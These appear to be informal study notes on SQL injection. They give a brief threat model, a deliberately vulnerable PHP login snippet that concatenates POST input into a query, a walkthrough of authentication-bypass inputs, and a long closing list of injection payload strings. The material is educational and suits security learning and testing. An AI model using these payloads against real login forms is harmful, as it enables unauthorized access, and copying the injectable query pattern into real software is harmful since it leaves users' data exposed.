# SQL incection
### SQL queries often involve untrusted data
1. App is responsible for interpolating user data into queries 
2. insufficeent sanatization could lead to modification of queries semantics

### Possible atatcks
1. Confidentiality :- modify queries to return unauthorized data
2. Integrity :- modify queries to peform unauthorized updates
3. Authentication :- modify query to bypass Authentication checks

## Server Threat Model
#### Attacker's goal:
1. Steal or modify information in the server-side database

#### Attacker's capability: submit arbitary data to the website
1. POSTed froms, URL pramaters, cookie values, HTTP request headers
#### Login Examples
1. select * from user_tbl where user= "%s" and pw="%s"
2. select * from user_tbl where user= "alice" and pw="12345"
2. select * from user_tbl where user= "bob" and pw="query1#"
2. select * from user_tbl where user= "googy" and pw="a"bc";
2. select * from user_tbl where user= "weird" and pw="123"
2. select * from user_tbl where user= "ece" and pw="" or 1=1; ==";
2. select * from user_tbl where user= "ece" and pw= 123' or '1'='1;

### To identify target website backent technology
use chrome/firefox extension :- Wappalyzer , BuiltWith

## Payloads


### Login Bypass Using SQL Injection:
 Its a very old trick.

### First let us see an example of piece of code that actually creates the Login Page vulnerable to this attack.
```
$uname=$_POST['uname'];
```

```
$passwrd=$_POST['passwrd'];
```

```
$query="select username,pass from users where username='$uname' and password='$passwrd' limit 0,1";
```

```
$result=mysql_query($query);
```

```
$rows = mysql_fetch_array($result);
```
```
if($rows)
{
echo "You have Logged in successfully" ;
create_session();
}
else
{
Echo "Better Luck Next time";
}
```
Now as we can see the query is quoting the input with single quote, that means we have to use a single quote to close the first quote and then inject.


So lets Inject  ```' or ''='``` into the Query:

Logging in with following details:

Username : ```' or ''='```
Password : ```' or ''='```

SQLQuery:

select username,pass from users where username=```'' or ''=''``` and password=```'' or ''='' limit 0,1;```

so what i actually did is made the query to return true using the or. 

We can even try and comment out the query using any comment operator like using the following username and password.

Username : ```' or 1--```
Password :

SQLQuery:

select username,pass from users where username=```'' or true--'``` and password=```'' or ''='' limit 0,1;```


Here anything after -- wont be executed which makes the query to be:

> select username,pass from users where username='' or true;

## Injections:
```
') or true--

') or ('')=('

') or 1--

') or ('x')=('

" or true--

" or ""="

" or 1--

" or "x"="

") or true--

") or ("")=("

") or 1--

") or ("x")=("

')) or true--

')) or ((''))=(('

')) or 1--

')) or (('x'))=(('

'-'

' '

'&'

'^'

'*'

' or ''-'

' or '' '

' or ''&'

' or ''^'

' or ''*'

"-"

" "

"&"

"^"

"*"
" or ""-"

" or "" "

" or ""&"

" or ""^"

" or ""*"

or true--

" or true--

' or true--

") or true--

') or true--

' or 'x'='x

') or ('x')=('x

')) or (('x'))=(('x

" or "x"="x

") or ("x")=("x

")) or (("x"))=(("x

```
